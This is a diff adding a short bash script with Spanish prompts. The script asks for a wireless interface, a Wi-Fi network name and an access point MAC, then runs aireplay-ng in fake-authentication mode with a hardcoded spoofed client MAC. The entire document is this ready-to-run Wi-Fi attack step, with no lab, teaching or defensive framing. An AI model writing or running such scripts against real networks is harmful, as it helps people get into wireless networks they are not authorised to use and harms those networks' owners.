@@ -1,0 +1,11 @@
+MAC="e0:b9:a5:57:81:83";
+echo "Interface a desactivar: ";
+read INTERFACE_A;
+echo $INTERFACE_A;
+echo "Nobre de red wifi: ";
+read NAME_NET;
+echo $NAME_NET;
+echo "MAC punto de acceso: ";
+read MAC_AP;
+echo $MAC_AP;
+aireplay-ng -1 0 -e $NAME_NET -a $MAC_AP -h $MAC $INTERFACE_A;
